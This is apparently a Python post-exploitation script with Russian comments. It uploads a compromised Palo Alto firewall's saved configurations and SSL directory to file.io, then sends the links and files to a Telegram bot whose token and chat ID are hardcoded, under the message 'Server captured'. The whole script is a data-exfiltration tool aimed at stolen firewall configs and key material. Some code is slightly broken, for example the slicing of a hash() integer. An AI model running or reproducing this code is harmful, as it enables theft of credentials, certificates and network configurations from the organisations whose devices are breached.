import requests
import os

def upload_file_to_filebin(file_path):
    """
    Загружает файл на файловый обменник (например, File.io)
    """
    url = 'https://file.io'
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        data = response.json()
        return data.get('link')  # Возвращаем ссылку на загруженный файл
    else:
        print("Ошибка загрузки файла")
        return None

def send_telegram_message(message, file_paths):
    """
    Отправляет сообщение в Telegram с файлами (ссылками)
    """
    tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
    tg_chat_id = '-1002403648422'
    
    # Формируем ссылку на Telegram API
    url = f'https://api.telegram.org/bot{tg_bot_token}/sendMessage'
    
    # Формируем сообщение с ссылками на файлы
    message += "\n\n" + "\n".join([f"Ссылка на файл: {file}" for file in file_paths])

    payload = {
        'chat_id': tg_chat_id,
        'text': message
    }
    
    # Отправка сообщения
    response = requests.post(url, data=payload)
    
    # Если нужно отправить сам файл, используем следующий код:
    file_urls = []
    for file_path in file_paths:
        with open(file_path, 'rb') as file:
            files = {
                'chat_id': tg_chat_id,
                'document': (os.path.basename(file_path), file)
            }
            send_file_url = f'https://api.telegram.org/bot{tg_bot_token}/sendDocument'
            send_response = requests.post(send_file_url, files=files)
            if send_response.status_code == 200:
                print(f"Файл {file_path} отправлен.")
                file_urls.append(file_path)  # Добавим файл, если успешно отправлен
    
    return response.ok, file_urls

def main():
    try:
        # Загрузка файлов
        files = ["/opt/pancfg/mgmt/saved-configs", "/opt/pancfg/mgmt/ssl"]
        
        file_links = []
        for file in files:
            link = upload_file_to_filebin(file)
            if link:
                file_links.append(link)
        
        if file_links:
            # Формируем сообщение
            message = "🟢 Server captured\n"
            message += f"------------------\n"
            message += f"IP: 192.168.1.1\n"  # Тут вставьте свой IP
            message += f"Country: Some Country\n"  # Тут вставьте страну
            message += f"City: Some City\n"  # Тут вставьте город
            message += f"------------------\n"
            message += f"#{hash('192.168.1.1')[:8]}"
            
            # Отправка сообщений и файлов
            success, sent_files = send_telegram_message(message, file_links)
            if success:
                print("Message sent successfully!")
            else:
                print("Error sending message.")
            
            # Если файлы успешно загружены на сервер, отправляем их
            if sent_files:
                print("Successfully uploaded files to file.io:", sent_files)
        else:
            print("No files uploaded.")
    
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
